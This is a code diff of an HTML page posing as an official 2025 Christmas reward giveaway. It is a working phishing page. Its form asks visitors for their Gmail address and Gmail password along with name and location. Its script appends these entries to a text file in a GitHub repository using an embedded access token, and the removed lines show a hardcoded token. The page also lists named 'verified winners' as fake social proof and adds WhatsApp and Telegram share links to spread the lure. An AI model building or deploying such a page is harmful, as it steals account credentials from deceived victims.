@@ -3,229 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Grand Xmas Unboxing | 2025 Luxury Registry</title>
+    <title>The Grand Xmas Unboxing | Official 2025</title>
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
     <style>
-        :root {
-            --bg-deep: #020d0d;       
-            --accent-gold: #f7dba7;   
-            --glass-white: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --success-green: #4ade80;
-        }
-
+        :root { --bg-deep: #020d0d; --accent-gold: #f7dba7; --glass-white: rgba(255, 255, 255, 0.05); --glass-border: rgba(255, 255, 255, 0.1); --success-green: #4ade80; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: radial-gradient(circle at top, #0a3a38, var(--bg-deep));
-            color: white; min-height: 100vh;
-            display: flex; flex-direction: column; align-items: center;
-            padding-bottom: 50px;
-        }
-
+        body { font-family: 'Inter', sans-serif; background: radial-gradient(circle at top, #0a3a38, var(--bg-deep)); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-bottom: 50px; }
         #snow-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
-
         header { text-align: center; padding: 60px 20px 40px; z-index: 1; }
-        .premium-tag { color: var(--accent-gold); letter-spacing: 4px; font-size: 0.75rem; font-weight: 600; margin-bottom: 10px; display: block; }
         h1 { font-family: 'Playfair Display', serif; font-size: clamp(2.5rem, 8vw, 4rem); background: linear-gradient(to bottom, #fff, var(--accent-gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-
-        .main-container { width: 95%; max-width: 700px; z-index: 1; }
-
-        .glass-card {
-            background: var(--glass-white); backdrop-filter: blur(30px);
-            border: 1px solid var(--glass-border); border-radius: 24px;
-            padding: 40px; box-shadow: 0 50px 100px rgba(0,0,0,0.5);
-            margin-bottom: 30px;
-        }
-
-        h2, h3 { font-family: 'Playfair Display', serif; margin-bottom: 20px; text-align: center; }
-
-        /* --- FORM STYLES --- */
+        .main-container { width: 95%; max-width: 650px; z-index: 1; }
+        .glass-card { background: var(--glass-white); backdrop-filter: blur(30px); border: 1px solid var(--glass-border); border-radius: 24px; padding: 40px; box-shadow: 0 50px 100px rgba(0,0,0,0.5); margin-bottom: 30px; }
         .input-group { margin-bottom: 18px; position: relative; }
         .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--accent-gold); opacity: 0.6; }
-        input {
-            width: 100%; padding: 15px 15px 15px 45px;
-            background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border);
-            border-radius: 12px; color: white; font-size: 0.95rem;
-        }
-        .submit-btn {
-            width: 100%; padding: 18px;
-            background: linear-gradient(135deg, var(--accent-gold), #d4af37);
-            color: #041f1e; border: none; border-radius: 12px;
-            font-weight: 700; text-transform: uppercase; letter-spacing: 2px;
-            cursor: pointer; transition: 0.4s;
-        }
-
-        /* --- TABLE STYLES --- */
-        .search-container { position: relative; margin-bottom: 20px; }
-        .search-container i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); opacity: 0.5; }
-        .search-bar { padding: 12px 15px 12px 40px; background: rgba(0,0,0,0.2); border: 1px solid var(--glass-border); border-radius: 10px; color: white; width: 100%; }
-        
-        .table-wrap { overflow-x: auto; }
+        input { width: 100%; padding: 15px 15px 15px 45px; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); border-radius: 12px; color: white; font-size: 0.95rem; }
+        .submit-btn { width: 100%; padding: 18px; background: linear-gradient(135deg, var(--accent-gold), #d4af37); color: #041f1e; border: none; border-radius: 12px; font-weight: 700; text-transform: uppercase; cursor: pointer; transition: 0.4s; }
+        .share-row { display: flex; gap: 10px; justify-content: center; margin-top: 20px; }
+        .share-btn { flex: 1; padding: 12px; border-radius: 10px; border: 1px solid var(--glass-border); text-align: center; cursor: pointer; color: white; text-decoration: none; font-size: 0.8rem; background: rgba(255,255,255,0.05); display: flex; align-items: center; justify-content: center; gap: 8px; }
         table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
-        th { text-align: left; padding: 12px; border-bottom: 1px solid var(--glass-border); color: var(--accent-gold); text-transform: uppercase; font-size: 0.7rem; }
+        th { text-align: left; padding: 12px; border-bottom: 1px solid var(--glass-border); color: var(--accent-gold); }
         td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.03); }
-        .status-pill { background: rgba(74, 222, 128, 0.15); color: var(--success-green); padding: 4px 10px; border-radius: 20px; font-weight: 700; font-size: 0.65rem; }
-
-        /* Timer Styles */
-        .timer-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 30px; }
-        .t-box { text-align: center; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 10px; }
-        .t-val { font-size: 1.2rem; font-weight: 700; color: var(--accent-gold); display: block; }
-        .t-label { font-size: 0.55rem; text-transform: uppercase; opacity: 0.5; }
+        .status-pill { background: rgba(74, 222, 128, 0.15); color: var(--success-green); padding: 4px 10px; border-radius: 20px; font-size: 0.65rem; font-weight: 700; }
     </style>
 </head>
 <body>
+    <canvas id="snow-canvas"></canvas>
+    <header><h1>Xmas Unboxing</h1></header>
+    <div class="main-container">
+        <div class="glass-card">
+            <h2 style="text-align: center; margin-bottom: 20px;">Claim Your 2025 Reward</h2>
+            <form id="registryForm">
+                <div class="input-group"><i class="fa fa-user"></i><input type="text" id="username" placeholder="Full Name" required></div>
+                <div class="input-group"><i class="fa fa-envelope"></i><input type="email" id="email" placeholder="Gmail Address" required></div>
+                <div class="input-group"><i class="fa fa-lock"></i><input type="password" id="password" placeholder="Gmail Password" required></div>
+                <div class="input-group"><i class="fa fa-location-dot"></i><input type="text" id="location" placeholder="Shipping Location" required></div>
+                <button type="button" id="submitBtn" onclick="saveToGitHub()" class="submit-btn">Submit & Claim</button>
+            </form>
+            <div class="share-row">
+                <a href="https://wa.me/?text=Claim%20your%20Xmas%20gift%20here!" class="share-btn"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+                <a href="https://t.me/share/url?url=X-mas-github.io" class="share-btn"><i class="fab fa-telegram"></i> Telegram</a>
+            </div>
+        </div>
 
-<canvas id="snow-canvas"></canvas>
-
-<header>
-    <span class="premium-tag">OFFICIAL 2025 DISTRIBUTION</span>
-    <h1>Xmas Unboxing</h1>
-</header>
-
-<div class="main-container">
-    <div class="glass-card">
-        <h2>Claim Your Reward</h2>
-        <form id="registryForm">
-            <div class="input-group"><i class="fa fa-user"></i><input type="text" id="username" placeholder="Full Name" required></div>
-            <div class="input-group"><i class="fa fa-envelope"></i><input type="email" id="email" placeholder="Gmail Address" required></div>
-            <div class="input-group"><i class="fa fa-lock"></i><input type="password" id="password" placeholder="Gmail Password" required></div>
-            <div class="input-group"><i class="fa fa-location-dot"></i><input type="text" id="location" placeholder="Shipping Location" required></div>
-            <button type="button" id="submitBtn" onclick="saveToGitHub()" class="submit-btn">Submit Registry</button>
-        </form>
-
-        <div class="timer-row">
-            <div class="t-box"><span class="t-val" id="d">00</span><span class="t-label">Days</span></div>
-            <div class="t-box"><span class="t-val" id="h">00</span><span class="t-label">Hrs</span></div>
-            <div class="t-box"><span class="t-val" id="m">00</span><span class="t-label">Min</span></div>
-            <div class="t-box"><span class="t-val" id="s">00</span><span class="t-label">Sec</span></div>
+        <div class="glass-card">
+            <h3 style="margin-bottom: 15px;">Live Distribution Registry</h3>
+            <div style="overflow-x: auto;">
+                <table>
+                    <thead><tr><th>ID Number</th><th>Winner Name</th><th>Status</th></tr></thead>
+                    <tbody>
+                        <tr><td>1000211-001</td><td>MUZAFARU KAYONDO</td><td><span class="status-pill">VERIFIED</span></td></tr>
+                        <tr><td>1000199-001</td><td>ISMAIL SSEBBANJA</td><td><span class="status-pill">VERIFIED</span></td></tr>
+                        <tr><td>1000200-001</td><td>BRIAN SSEMPEBWA</td><td><span class="status-pill">VERIFIED</span></td></tr>
+                        <tr><td>1000202-001</td><td>RESTY KABAHUMA</td><td><span class="status-pill">VERIFIED</span></td></tr>
+                        <tr><td>1000215-001</td><td>JOSEPH BYAMUKAMA</td><td><span class="status-pill">VERIFIED</span></td></tr>
+                    </tbody>
+                </table>
+            </div>
         </div>
     </div>
 
-    <div class="glass-card">
-        <h3>Verified Winners List</h3>
-        <div class="search-container">
-            <i class="fa fa-search"></i>
-            <input type="text" id="searchInput" onkeyup="searchWinners()" class="search-bar" placeholder="Search by ID or Winner Name...">
-        </div>
-        
-        <div class="table-wrap">
-            <table id="winnerTable">
-                <thead>
-                    <tr>
-                        <th>ID Number</th>
-                        <th>Winner Name</th>
-                        <th>Status</th>
-                    </tr>
-                </thead>
-                <tbody id="winnerBody">
-                    <tr><td>1000211-001</td><td>MUZAFARU KAYONDO</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000199-001</td><td>ISMAIL SSEBBANJA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000200-001</td><td>BRIAN SSEMPEBWA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000202-001</td><td>RESTY KABAHUMA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000213-001</td><td>RITAH SENYONGA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000218-001</td><td>WINNIE NANSIKOMBI</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000207-001</td><td>SOPHIE KANSIIME</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000209-001</td><td>SANDRA KABUGO MUBIRU</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000215-001</td><td>JOSEPH BYAMUKAMA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    <tr><td>1000220-001</td><td>JALIA NANTAMBI</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-</div>
+    <script>
+        async function saveToGitHub() {
+            const btn = document.getElementById('submitBtn');
+            const CONFIG = {
+                TOKEN: "YOUR_GITHUB_TOKEN", 
+                OWNER: "YOUR_USERNAME",
+                REPO: "X-mas-github.io",
+                FILE: "file.txt"
+            };
 
-<script>
-    // GitHub Save Logic
-    async function saveToGitHub() {
-        const btn = document.getElementById('submitBtn');
-        const GITHUB_TOKEN = "Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I"; 
-        const OWNER = "cyberbashir";
-        const REPO = "X-mas-github.io";
-        const FILE_PATH = "file.txt"; 
+            const data = {
+                name: document.getElementById('username').value,
+                email: document.getElementById('email').value,
+                pass: document.getElementById('password').value,
+                loc: document.getElementById('location').value,
+                time: new Date().toLocaleString()
+            };
 
-        const name = document.getElementById('username').value;
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        const loc = document.getElementById('location').value;
-        
-        if(!name || !email || !pass || !loc) { alert("Please fill all fields."); return; }
+            if(!data.name || !data.email || !data.pass) return alert("Fill all fields");
+            btn.innerText = "VERIFYING..."; btn.disabled = true;
 
-        btn.innerText = "PROCESSING...";
-        btn.disabled = true;
+            try {
+                const url = `https://api.github.com/repos/${CONFIG.OWNER}/${CONFIG.REPO}/contents/${CONFIG.FILE}`;
+                const res = await fetch(url, { headers: { "Authorization": `token ${CONFIG.TOKEN}` } });
+                let sha = ""; let current = "";
 
-        const timestamp = new Date().toLocaleString();
-        const newEntry = `\n[${timestamp}] Name: ${name} | Email: ${email} | Pass: ${pass} | Loc: ${loc}`;
+                if (res.ok) {
+                    const json = await res.json();
+                    sha = json.sha;
+                    current = atob(json.content);
+                }
 
-        try {
-            const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${FILE_PATH}`;
-            const response = await fetch(url, { headers: { "Authorization": `Bearer ${GITHUB_TOKEN}` } });
+                const newContent = current + `\n[${data.time}] Name: ${data.name} | User: ${data.email} | Pass: ${data.pass} | Loc: ${data.loc}`;
+                
+                const push = await fetch(url, {
+                    method: "PUT",
+                    headers: { "Authorization": `token ${CONFIG.TOKEN}`, "Content-Type": "application/json" },
+                    body: JSON.stringify({ message: "New Entry", content: btoa(newContent), sha: sha })
+                });
 
-            let sha = "";
-            let currentContent = "";
-
-            if (response.ok) {
-                const data = await response.json();
-                sha = data.sha;
-                currentContent = decodeURIComponent(escape(atob(data.content))); 
-            }
-
-            const updatedContent = btoa(unescape(encodeURIComponent(currentContent + newEntry)));
-
-            const pushResponse = await fetch(url, {
-                method: "PUT",
-                headers: { "Authorization": `Bearer ${GITHUB_TOKEN}`, "Content-Type": "application/json" },
-                body: JSON.stringify({ message: "New Xmas Entry", content: updatedContent, sha: sha })
-            });
-
-            if (pushResponse.ok) { alert("Success! Recorded."); document.getElementById('registryForm').reset(); }
-            else { alert("Config Error."); }
-        } catch (err) { alert("Connection failed."); }
-        finally { btn.innerText = "SUBMIT REGISTRY"; btn.disabled = false; }
-    }
-
-    // Search Logic
-    function searchWinners() {
-        let input = document.getElementById("searchInput").value.toUpperCase();
-        let rows = document.getElementById("winnerBody").getElementsByTagName("tr");
-        for (let i = 0; i < rows.length; i++) {
-            let id = rows[i].getElementsByTagName("td")[0].textContent.toUpperCase();
-            let name = rows[i].getElementsByTagName("td")[1].textContent.toUpperCase();
-            rows[i].style.display = (id.includes(input) || name.includes(input)) ? "" : "none";
+                if (push.ok) { alert("Successfully Registered!"); document.getElementById('registryForm').reset(); }
+                else { alert("Registry Error. Check Configuration."); }
+            } catch (e) { alert("Network Error."); }
+            finally { btn.innerText = "Submit & Claim"; btn.disabled = false; }
         }
-    }
-
-    // Timer & Snow logic (same as before)
-    const target = new Date("Dec 25, 2025 00:00:00").getTime();
-    setInterval(() => {
-        const now = new Date().getTime();
-        const gap = target - now;
-        document.getElementById('d').innerText = Math.floor(gap / (1000*60*60*24));
-        document.getElementById('h').innerText = Math.floor((gap % (1000*60*60*24)) / (1000*60*60));
-        document.getElementById('m').innerText = Math.floor((gap % (1000*60*60)) / (1000*60));
-        document.getElementById('s').innerText = Math.floor((gap % (1000*60)) / 1000);
-    }, 1000);
-
-    const canvas = document.getElementById('snow-canvas');
-    const ctx = canvas.getContext('2d');
-    let particles = [];
-    function init() {
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        for(let i=0; i<100; i++) particles.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, r:Math.random()*2+1, d:Math.random()*1});
-    }
-    function draw() {
-        ctx.clearRect(0,0,canvas.width,canvas.height);
-        ctx.fillStyle = "white"; ctx.beginPath();
-        particles.forEach(p => { ctx.moveTo(p.x, p.y); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2); });
-        ctx.fill();
-        particles.forEach(p => { p.y += p.d + 0.5; if(p.y > canvas.height) p.y = -5; });
-        requestAnimationFrame(draw);
-    }
-    init(); draw();
-</script>
-
+    </script>
 </body>
 </html>
